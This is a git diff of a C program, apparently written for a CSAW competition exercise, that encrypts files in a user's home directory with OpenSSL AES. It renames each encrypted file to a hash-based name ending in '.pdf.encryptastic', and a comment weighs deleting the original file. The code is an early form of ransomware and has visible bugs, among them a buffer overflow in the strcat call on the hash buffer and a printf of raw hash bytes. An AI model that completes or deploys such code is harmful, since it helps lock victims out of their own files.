@@ -19,9 +19,9 @@
 #define ERR_EVP_CTX_NEW -4
 
 #define AES_KEY_SIZE 16
-#define CHUNK_SIZE 16
+#define IV_SIZE 16
 #define BUFSIZE 1024 //increase this?
-#define HASH_BUFSIZE 256
+//#define HASH_BLOCK_SIZE 64
 
 
 struct materials {
@@ -47,7 +47,7 @@ Struct Gin(){
 
     Struct *mats = (Struct *)malloc(sizeof(Struct));
     mats->key = malloc(AES_KEY_SIZE);
-    mats->iv = malloc(CHUNK_SIZE);
+    mats->iv = malloc(IV_SIZE);
 
     if (!mats) {
         /* Unable to allocate memory on heap*/
@@ -76,26 +76,48 @@ int inkripshun(char* infilename, Struct *mats){
     FILE *outfile;
 
     infile = fopen(infilename, "rb");
-         if (!infilename) {
+         if (!infile) {
         /* Unable to open file for reading */
         fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
         return errno;
     };
 
-    char outfileName[strlen(infilename) + 13];
-    strcpy(outfileName,infilename);
-    strcat(outfileName,".encryptastic");
-
     // Hash contents
-    // What hash do we want to use?
-    /*
-    unsigned char outfileName[HASH_BUFSIZE];
+
+    unsigned char outfileName[SHA256_DIGEST_LENGTH];
     SHA256_CTX sha256;
     SHA256_Init(&sha256);
-    // Implement rest of hash here..
-    outfileName = "";
-    */
 
+    int num_bytes_read1 = 0;
+    char* hashbuf = malloc(BUFSIZE);
+
+    while(1){
+    
+    // Read in data in blocks until EOF. Update the ciphering with each read.
+    num_bytes_read1 = fread(hashbuf, sizeof(unsigned char), BUFSIZE, infile);
+    if (ferror(infile)){
+        fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
+        cleanup(mats, infile, outfile, errno);
+    }
+    if(!SHA256_Update(&sha256, hashbuf, num_bytes_read1)){
+        fprintf(stderr, "ERROR: SHA256_Update failed. OpenSSL error: %s\n", 
+                ERR_error_string(ERR_get_error(), NULL));
+        cleanup(mats, infile, outfile, errno);
+    }
+    if (num_bytes_read1 < BUFSIZE) {
+        /* Reached End of file */
+        break;
+    }
+    SHA256_Final(outfileName, &sha256);
+    printf(outfileName);
+    }
+
+    rewind(infile);    
+    
+    //char outfileName[strlen(infilename) + 13];
+    //strcpy(outfileName,infilename);
+    strcat(outfileName,".pdf.encryptastic");
+    
 
     outfile = fopen(outfileName, "wb");
     if (!outfile) {
@@ -118,14 +140,14 @@ int inkripshun(char* infilename, Struct *mats){
         fprintf(stderr, "ERROR: EVP_CIPHER_CTX_new failed. OpenSSL error: %s\n", 
                 ERR_error_string(ERR_get_error(), NULL));
         cleanup(mats, infile, outfile, ERR_EVP_CTX_NEW);
-    }
+    };
 
     /* Don't set key or IV right away; we want to check lengths */
     if(!EVP_CipherInit_ex(ctx, mats->cipher_type, NULL, NULL, NULL, 1)){
         fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", 
                 ERR_error_string(ERR_get_error(), NULL));
         cleanup(mats, infile, outfile, ERR_EVP_CIPHER_INIT);
-    }
+    };
 
     OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE);
     OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == AES_KEY_SIZE);
@@ -136,10 +158,11 @@ int inkripshun(char* infilename, Struct *mats){
         ERR_error_string(ERR_get_error(), NULL));
         EVP_CIPHER_CTX_cleanup(ctx);
         cleanup(mats, infile, outfile, ERR_EVP_CIPHER_INIT);
-    }
+    };
+
 
     while(1){
-        // Read in data in blocks until EOF. Update the ciphering with each read.
+        // Read in data in blocks until EOF. Update the cipher with each read.
         num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, infile);
         if (ferror(infile)){
             fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
@@ -161,9 +184,8 @@ int inkripshun(char* infilename, Struct *mats){
         if (num_bytes_read < BUFSIZE) {
             /* Reached End of file */
             break;
-        }
-    }
-
+        };
+    } 
     /* Now cipher the final block and write it out to file */
     if(!EVP_CipherFinal_ex(ctx, out_buf, &out_len)){
         fprintf(stderr, "ERROR: EVP_CipherFinal_ex failed. OpenSSL error: %s\n", 
@@ -180,7 +202,7 @@ int inkripshun(char* infilename, Struct *mats){
     EVP_CIPHER_CTX_cleanup(ctx);
 
     // Delete original file?  
-    // Have to return an int.
+    
     return 0;
 };
 
@@ -203,12 +225,6 @@ const char* chekDirectoree(){
     printf("User name: %s\n", userName);
     printf("Home directory is %s\n", getenv("USERPROFILE"));
     printf("Checking Directory %s\n", targitDirectoree);
-};
-
-// Check PDF function
-int isPDF(FILE *checkFile){
-    
-    return 0;
 };
 
 // Main
@@ -239,4 +255,4 @@ int main(){
     } else {
         printf("Did not find the CSAW secret directory.\n");
     }
-};
+}
